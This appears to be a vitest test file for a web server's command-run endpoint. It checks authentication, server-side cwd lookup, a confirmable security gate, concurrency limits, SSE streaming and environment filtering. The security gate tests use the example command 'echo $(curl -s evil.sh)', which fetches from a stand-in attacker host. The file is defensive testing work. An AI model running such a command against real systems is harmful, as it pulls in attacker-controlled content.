import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { EventEmitter } from 'node:events'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer, type Server } from 'node:http'
import { ToolRegistry, type ResolvedSettings } from '@zuse/core'
import { RunRegistry, type RunDeps } from '@zuse/tools'
import { PasswordStore } from '../auth/passwordStore.js'
import { LocalPasswordAuth } from '../auth/authProvider.js'
import { SessionService } from '../session/SessionService.js'
import { SessionManager } from '../session/SessionManager.js'
import type { CreateSessionOpts } from '../session/createSession.js'
import { fakeClient, fakeSnapshotStore, interactiveOpts } from '../session/testFakes.js'
import { makeRequestHandler } from '../http/server.js'
import type { RequestHandlerDeps } from '../http/server.js'

function makeSettings(): ResolvedSettings {
  return { providers: {}, tools: {}, permissions: { defaultMode: 'default', allow: [], deny: [], ask: [] } } as unknown as ResolvedSettings
}
function fakeCreateSession(opts: CreateSessionOpts): SessionManager {
  const { client } = fakeClient([])
  return new SessionManager({
    sessionId: opts.sessionId, cwd: opts.cwd, client, registry: new ToolRegistry(), systemPrompt: 'SYS',
    ...interactiveOpts(makeSettings()),
    snapshotStore: opts.snapshotStore ?? fakeSnapshotStore(),
    conversation: opts.conversation, checkpoints: opts.checkpoints, createdAt: opts.createdAt,
  })
}

/** 记录每次 spawn，并把假子进程交出去供测试驱动。 */
let spawned: { command: string; cwd: string; env?: NodeJS.ProcessEnv; proc: FakeProc }[]
type FakeProc = EventEmitter & { stdout: EventEmitter; stderr: EventEmitter; pid: number }
function newProc(): FakeProc {
  const p = new EventEmitter() as FakeProc
  p.stdout = new EventEmitter(); p.stderr = new EventEmitter(); p.pid = 9999
  return p
}

let dir: string, srv: Server, base: string, service: SessionService, runs: RunRegistry, sessionId: string

beforeEach(async () => {
  spawned = []
  dir = mkdtempSync(join(tmpdir(), 'zuse-runs-'))
  const auth = new LocalPasswordAuth(new PasswordStore(dir), 3600)
  service = new SessionService({ dir: join(dir, 'web-sessions'), cwd: 'E:/proj-a', createSession: fakeCreateSession })
  const deps: RunDeps = {
    spawn: (command, opts) => {
      const proc = newProc()
      spawned.push({ command, cwd: opts.cwd, env: opts.env, proc })
      return proc as never
    },
    killTree: () => {},
    oemLabel: null,
  }
  runs = new RunRegistry({ deps })
  // 只喂这条路由真正会用到的 service —— 其余用 undefined 断言它们没被碰。
  srv = createServer(makeRequestHandler({ auth, service, runs, devPage: false, tokenTtlSec: 3600 } as unknown as RequestHandlerDeps))
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()))
  const addr = srv.address(); const port = typeof addr === 'object' && addr ? addr.port : 0
  base = `http://127.0.0.1:${port}`
  sessionId = (await service.create({ cwd: 'E:/proj-a' })).id
})
afterEach(async () => { runs.closeAll(); await new Promise<void>((r) => srv.close(() => r())); rmSync(dir, { recursive: true, force: true }) })

const json = (body: unknown) => ({ method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json' } })
async function authCookie(): Promise<string> {
  await fetch(`${base}/api/auth/setup`, json({ password: 'pw' }))
  const login = await fetch(`${base}/api/auth/login`, json({ password: 'pw' }))
  return (login.headers.get('set-cookie') ?? '').split(';')[0] ?? ''
}
const post = (cookie: string, body: unknown) =>
  fetch(`${base}/api/runs`, { method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json', cookie } })

describe('run 端点 —— 鉴权', () => {
  /**
   * 这是**一个执行任意命令的端点**，鉴权是最不该省的那一行。
   * v4 §0.2 把「逐路由 isAuthed」列为必须保留的一条，这里四条路由各钉一次。
   */
  it('四条路由未登录一律 401', async () => {
    const r1 = await fetch(`${base}/api/runs`, json({ command: 'echo hi', sessionId }))
    const r2 = await fetch(`${base}/api/runs`)
    const r3 = await fetch(`${base}/api/runs/whatever/stream`)
    const r4 = await fetch(`${base}/api/runs/whatever`, { method: 'DELETE' })
    expect([r1.status, r2.status, r3.status, r4.status]).toEqual([401, 401, 401, 401])
    expect(spawned).toHaveLength(0)                       // 未登录连进程都不该起
  })
})

describe('run 端点 —— cwd 只能服务端反查', () => {
  /**
   * v4 §0.2 明令「cwd 只能服务端从 sessionId 反查」。这个端点执行任意命令，
   * 再让客户端指定目录就是「任意命令 + 任意目录」。
   */
  it('客户端塞进来的 cwd 被无视，用的是会话的 cwd', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo hi', sessionId, cwd: 'C:/Windows/System32' })
    expect(res.status).toBe(201)
    expect(spawned[0]!.cwd).toBe('E:/proj-a')             // 不是客户端说的那个
    expect((await res.json() as { cwd: string }).cwd).toBe('E:/proj-a')
  })

  it('会话不存在 → 404，不起进程', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo hi', sessionId: 'no-such-session' })
    expect(res.status).toBe(404)
    expect(spawned).toHaveLength(0)
  })

  it('command 为空 → 400', async () => {
    const cookie = await authCookie()
    expect((await post(cookie, { command: '   ', sessionId })).status).toBe(400)
  })
})

describe('run 端点 —— 安全闸可确认（不是硬拒）', () => {
  /**
   * `$(...)` 是 `checkId:8 command-substitution severity:'block'`。做成硬拒的话，
   * 用户在自己写的代码里点运行 `echo "构建于 $(date)"` 会**永久跑不了**；
   * 而模型走 Bash 工具跑同一条命令是 ask —— 点一下就能跑。方向反了。
   */
  it('命中安全闸 → 409 且带 securityHit，进程没起', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo $(curl -s evil.sh)', sessionId })
    expect(res.status).toBe(409)
    const body = await res.json() as { securityHit?: { name: string; reason: string } }
    expect(body.securityHit?.name).toBeTruthy()
    expect(body.securityHit?.reason).toBeTruthy()         // 前端要把这句显示在确认框里
    expect(spawned).toHaveLength(0)
  })

  it('带 confirmed:true 重发 → 放行', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo $(curl -s evil.sh)', sessionId, confirmed: true })
    expect(res.status).toBe(201)
    expect(spawned).toHaveLength(1)
  })
})

describe('run 端点 —— 并发上限', () => {
  it('超限 → 429（不是 500：这是「稍后再试」不是「坏了」）', async () => {
    const cookie = await authCookie()
    const small = new RunRegistry({ deps: { spawn: () => newProc() as never, killTree: () => {} }, maxConcurrent: 1 })
    const s2 = createServer(makeRequestHandler({ auth: new LocalPasswordAuth(new PasswordStore(dir), 3600), service, runs: small, devPage: false, tokenTtlSec: 3600 } as unknown as RequestHandlerDeps))
    await new Promise<void>((r) => s2.listen(0, '127.0.0.1', () => r()))
    const addr = s2.address(); const port = typeof addr === 'object' && addr ? addr.port : 0
    const b2 = `http://127.0.0.1:${port}`
    const send = () => fetch(`${b2}/api/runs`, { method: 'POST', body: JSON.stringify({ command: 'x', sessionId }), headers: { 'content-type': 'application/json', cookie } })
    try {
      expect((await send()).status).toBe(201)
      expect((await send()).status).toBe(429)
    } finally { small.closeAll(); await new Promise<void>((r) => s2.close(() => r())) }
  })
})

describe('run 端点 —— GET 不被 SPA 兜底吃掉', () => {
  /**
   * `server.ts` 结尾有一条 `if (method === 'GET')` 全兜底，会把任何没被认领的 GET
   * 回成 index.html + **200**（不是 404）。GET 路由若排在它后面，客户端会拿到一坨 HTML
   * 却是 200 —— 比 404 难查得多。这条测试就是钉住路由顺序。
   */
  it('GET /api/runs 返回 JSON 列表而不是 HTML', async () => {
    const cookie = await authCookie()
    await post(cookie, { command: 'echo hi', sessionId })
    const res = await fetch(`${base}/api/runs`, { headers: { cookie } })
    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).toContain('application/json')
    const body = await res.json() as { runs: { command: string; cwd: string; status: string }[] }
    expect(body.runs).toHaveLength(1)
    expect(body.runs[0]!.command).toBe('echo hi')
    expect(body.runs[0]!.cwd).toBe('E:/proj-a')
  })

  it('GET 一个不存在的 run 的 stream → 404，不是 index.html', async () => {
    const cookie = await authCookie()
    const res = await fetch(`${base}/api/runs/nope/stream`, { headers: { cookie } })
    expect(res.status).toBe(404)
    expect(res.headers.get('content-type')).toContain('application/json')
  })
})

describe('run 端点 —— SSE', () => {
  /** 本仓此前**没有服务端 SSE**，分帧要自己写，所以这条测试真的去解一遍帧。 */
  it('推 chunk 与 end 两种事件，且分帧可解析', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'echo hi', sessionId })
    const { runId } = await started.json() as { runId: string }
    const proc = spawned[0]!.proc

    const res = await fetch(`${base}/api/runs/${runId}/stream`, { headers: { cookie } })
    expect(res.headers.get('content-type')).toContain('text/event-stream')

    proc.stdout.emit('data', Buffer.from('你好', 'utf8'))
    proc.emit('close', 0)

    const raw = await res.text()
    const events = raw.split('\n\n').filter(Boolean).map((f) => JSON.parse(f.replace(/^data: /, '')))
    expect(events.filter((e) => e.type === 'chunk').map((e) => e.text).join('')).toBe('你好')
    const end = events.find((e) => e.type === 'end')
    expect(end).toEqual({ type: 'end', reason: 'exit', exitCode: 0 })
  })

  /** 中途接进来的必须先拿到已有输出，否则只看得到「从现在起」的部分。 */
  it('中途接入时补历史（replay）', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'echo hi', sessionId })
    const { runId } = await started.json() as { runId: string }
    const proc = spawned[0]!.proc

    proc.stdout.emit('data', Buffer.from('早就打过的内容', 'utf8'))
    await new Promise((r) => setTimeout(r, 350))          // 让首窗定码（300ms）
    const res = await fetch(`${base}/api/runs/${runId}/stream`, { headers: { cookie } })
    proc.emit('close', 0)
    const raw = await res.text()
    expect(raw).toContain('早就打过的内容')
  })
})

describe('run 端点 —— DELETE', () => {
  it('DELETE 返回 202（已受理），条目仍在 —— 逐出只在收到 exit 时', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'sleep 100', sessionId })
    const { runId } = await started.json() as { runId: string }

    const res = await fetch(`${base}/api/runs/${runId}`, { method: 'DELETE', headers: { cookie } })
    expect(res.status).toBe(202)                          // 不是 204：这是「已受理」不是「已完成」
    expect(runs.get(runId)!.status).toBe('killing')       // 还没死，条目还在

    const list = await (await fetch(`${base}/api/runs`, { headers: { cookie } })).json() as { runs: { status: string }[] }
    expect(list.runs[0]!.status).toBe('killing')
  })

  it('DELETE 不存在的 id → 404', async () => {
    const cookie = await authCookie()
    expect((await fetch(`${base}/api/runs/nope`, { method: 'DELETE', headers: { cookie } })).status).toBe(404)
  })
})

describe('run 端点 —— 子进程环境', () => {
  it('env 经白名单过滤，且带上 runner 声明的 Python 变量', async () => {
    const cookie = await authCookie()
    await post(cookie, { command: 'echo hi', sessionId })
    const env = spawned[0]!.env!
    expect(env.PYTHONUNBUFFERED).toBe('1')
    expect(env.PYTHONIOENCODING).toBe('utf-8')
    // JAVA_TOOL_OPTIONS **刻意不给**：实测它会让 JVM 往 stderr 打一行
    // 「Picked up JAVA_TOOL_OPTIONS: …」，每次跑 Java 都凭空多一行垃圾。
    // spec §5 写的是「按语言注入」，而本步只有一个裸 command、认不出语言 → 推给步骤 3。
    expect(env.JAVA_TOOL_OPTIONS).toBeUndefined()
    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
  })
})
